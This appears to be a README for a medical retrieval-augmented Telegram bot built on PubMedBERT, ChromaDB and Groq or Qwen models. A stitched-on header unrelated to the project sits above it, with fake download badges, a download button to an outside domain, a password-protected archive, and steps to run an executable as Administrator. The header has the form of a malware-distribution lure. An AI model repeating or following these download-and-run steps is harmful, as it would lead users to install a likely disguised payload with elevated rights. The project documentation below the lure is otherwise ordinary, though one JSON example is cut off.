<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# 🩺 Clinic RAG Bot

A **domain-specific medical Retrieval-Augmented Generation (RAG)** system that answers health-related questions **strictly based on retrieved evidence** from a local vector database. Built with Python 3.12, PubMedBERT embeddings, ChromaDB, and a dual-LLM backend (Groq API + Local Qwen 2.5).

> **Core principle:** If the answer is not in the database, the bot says so. No hallucination. No general-knowledge guessing.

---

## ✨ Features

- **🔍 Evidence-Based Answers** — Retrieves from NHS, MedlinePlus, and Mayo Clinic data before generating any response.
- **🛡️ Safety Agent** — Automatically detects emergency symptoms (chest pain, severe bleeding, etc.) and returns an urgent-care disclaimer instead of a casual answer.
- **🤖 Telegram Bot Interface** — Async bot using `python-telegram-bot` v20+ with non-blocking RAG processing.
- **🧠 Dual LLM Backend** — Switch instantly between **Groq API** (fast, high-quality) and **local Qwen 2.5 0.5B** (free, offline, private).
- **📚 Local Vector Store** — ChromaDB with **PubMedBERT** embeddings (`pritamdeka/S-PubMedBert-MS-MARCO`) for medically-aware semantic search.
- **⚡ Lazy Initialization** — Heavy models load only once and only when needed, preventing circular imports and double-loading.

---

## 🏗️ Architecture

```
┌─────────────┐     ┌─────────────────┐     ┌──────────────────┐
│   Telegram  │────▶│   main.py       │────▶│ ClinicRAGPipeline│
│   User      │     │   (Entry Point) │     │   (Orchestrator) │
└─────────────┘     └─────────────────┘     └────────┬─────────┘
                                                     │
           ┌─────────┬──────────┬────────────┬──────┘
           ▼         ▼          ▼            ▼
    ┌──────────┐ ┌──────┐ ┌──────────┐ ┌────────────┐
    │  Safety  │ │Router│ │Retriever │ │  Generator │
    │  Agent   │ │      │ │(ChromaDB)│ │(Groq/Qwen) │
    └──────────┘ └──────┘ └────┬─────┘ └─────┬──────┘
                               │             │
                    ┌──────────▼─────────┐   │
                    │  PubMedBERT        │   │
                    │  Vector Embeddings │   │
                    └────────────────────┘   │
                                             │
                              ┌──────────────▼──────────────┐
                              │  NHS / MedlinePlus / Mayo   │
                              │  (JSON chunks in ChromaDB)  │
                              └─────────────────────────────┘
```

---

## 🛠️ Tech Stack

| Component | Technology |
|-----------|------------|
| **Language** | Python 3.12 |
| **Embeddings** | `sentence-transformers` + `pritamdeka/S-PubMedBert-MS-MARCO` (768-dim) |
| **Vector DB** | ChromaDB (`chromadb>=0.5`) with cosine HNSW indexing |
| **Local LLM** | Qwen 2.5 0.5B Instruct (`Qwen/Qwen2.5-0.5B-Instruct`) via HuggingFace Transformers |
| **Cloud LLM** | Groq API (`llama-3.3-70b-versatile`) |
| **Telegram** | `python-telegram-bot>=20` (async) |
| **Config** | Custom YAML/JSON config loader + `python-dotenv` |
| **Logging** | Centralized `clinic_rag_bot` logger |

---

## 📦 Installation

### 1. Clone & Navigate
```bash
git clone <your-repo-url>
cd clinic_rag_bot
```

### 2. Create Virtual Environment (Python 3.12)
```bash
python -m venv venv

# Windows
venv\Scripts\activate

# macOS/Linux
source venv/bin/activate
```

### 3. Install Dependencies
```bash
pip install -r requirements.txt
```

**Key packages installed:**
```text
torch>=2.0.0
sentence-transformers>=3.0.0
transformers>=4.40.0
chromadb>=0.5.0
python-telegram-bot>=20.0
groq>=0.9.0
python-dotenv>=1.0.0
numpy>=1.23.5,<2.5.0
httpx>=0.27.0
```

---

## ⚙️ Configuration

Create a `.env` file in the project root:

```env
# ─── Telegram ───
TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here

# ─── LLM Provider Toggle ───
# Set to 'true' to use free local Qwen (offline, no API key needed)
# Set to 'false' to use Groq API (faster, higher quality)
USE_LOCAL_LLM=false

# ─── Groq (required if USE_LOCAL_LLM=false) ───
GROQ_API_KEY=gsk_your_groq_key_here

# ─── HuggingFace (optional, for higher download limits) ───
HF_TOKEN=your_huggingface_token

# ─── Chroma Collection Name ───
# Must match between ingestion and retriever
CHROMA_COLLECTION=clinic_data
```

---

## 🚀 Usage

### 1. Ingest Medical Data (One-time Setup)

Place your JSON files in:
```
data/raw/medlineplus/
data/raw/mayo/
data/raw/nhs/
```

Each JSON file should follow this schema:
```json
{
  "title": "Headaches",
  "source": "NHS",
### 2. Test via CLI

```bash
# Using Groq (default)
python main.py --query "i have a headache"

# Using Local Qwen (free, offline)
python main.py --query "what are diabetes symptoms"
```

### 3. Run Telegram Bot

```bash
# Correct way
python main.py --bot

# ❌ Do NOT run the bot file directly (causes circular import)
# python bot/telegram_bot.py
```

The bot will print:
```
Telegram Bot is starting...
Bot connected: @YourBotName
Bot is now polling. Send a message on Telegram!
```

---

## 📁 Project Structure

```
clinic_rag_bot/
├── .env                          # Environment variables
├── .gitignore
├── README.md                     # This file
├── requirements.txt
├── main.py                       # Entry point (CLI + Telegram)
│
├── bot/
│   └── telegram_bot.py           # Telegram adapter (async handlers)
│
├── src/
│   ├── pipeline.py               # ClinicRAGPipeline orchestrator
│   ├── pubmed.py                 # GeneralKnowledgeRetriever
│   ├── retrievers.py             # LocalRAGRetriever wrapper
│   ├── vector_store.py           # ChromaDB client (explicit embeddings)
│   ├── embeddings.py             # PubMedBERT wrapper
│   ├── generator.py              # AnswerGenerator (Groq / Qwen toggle)
│   ├── local_llm.py              # Qwen 2.5 0.5B local inference
│   ├── ingestion.py              # JSON → ChromaDB indexer
│   ├── safety_agent.py           # Emergency symptom detection
│   ├── router.py                 # Query intent classification
│   ├── config_loader.py          # YAML/JSON config parser
│   └── logger.py                 # Centralized logging
│
└── data/
    ├── raw/
    │   ├── medlineplus/          # *.json medical articles
    │   ├── mayo/
    │   └── nhs/
    └── chroma_db/                # Persistent ChromaDB (auto-generated)
```

---

## 🔑 Key Technical Decisions

### Explicit Embeddings (No Auto-Embed)
ChromaDB defaults to `all-MiniLM-L6-v2` (384-dim) for auto-embedding. We **override this** by computing embeddings with `EmbeddingModelLocal` (PubMedBERT, 768-dim) and passing them explicitly via `collection.add(embeddings=...)`. This prevents the catastrophic "distance=31" mismatch bug.

### Cosine Distance → Similarity
ChromaDB returns **distance**, not similarity:
- `distance = 0` → identical
- `distance = 2` → completely opposite
- **Conversion:** `similarity = 1 - (distance / 2)`

### Lazy Pipeline Loading
`main.py` does **not** instantiate `ClinicRAGPipeline` at import time. It uses a `_get_pipeline()` singleton. This prevents:
- Double model loading when `telegram_bot.py` imports `process_request`
- Circular import crashes

### Context Truncation
Groq's free tier has a **6,000–12,000 TPM limit**. Medical documents are long, so the generator limits evidence to:
- **Max 2 chunks**
- **Max 800 characters per chunk**
- **Max ~1,600 total context characters**

This keeps prompts under ~1,500 tokens, avoiding `413 Request too large` errors.

---

## 🐛 Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| `ImportError: cannot import name 'process_request'` | Circular import | Run `python main.py --bot`, **never** `python bot/telegram_bot.py` |
| `413 Request too large` | Prompt exceeds Groq TPM limit | Context is auto-truncated in `generator.py`. Lower `top_k` in retriever. |
| `401 Invalid API Key` | Groq key missing or wrong | Check `.env` file. Or set `USE_LOCAL_LLM=true` for free local mode. |
| `[]` empty retriever results | Wrong collection name | Ensure `pubmed.py` collection name matches ingestion (`clinic_data`) |
| Distance values like `31.45` | DB embedded with wrong model | **Delete `data/chroma_db`** and re-run `python src/ingestion.py` |
| Bot starts then exits immediately | `run_bot()` not called or loop not blocked | Use `asyncio.Event().wait()` in `telegram_bot.py` |

---

## ⚠️ Medical Disclaimer

This bot is **not a substitute for professional medical advice, diagnosis, or treatment**. It is an information retrieval tool designed to surface verified medical content from public databases.

- Always seek the advice of your physician or other qualified health provider with any questions you may have regarding a medical condition.
- **If you are experiencing a medical emergency, call your local emergency services immediately.**

---

## 📝 License

This project is open-source. Feel free to fork and adapt for educational or research purposes.

---

Built with ❤️ for responsible AI in healthcare.
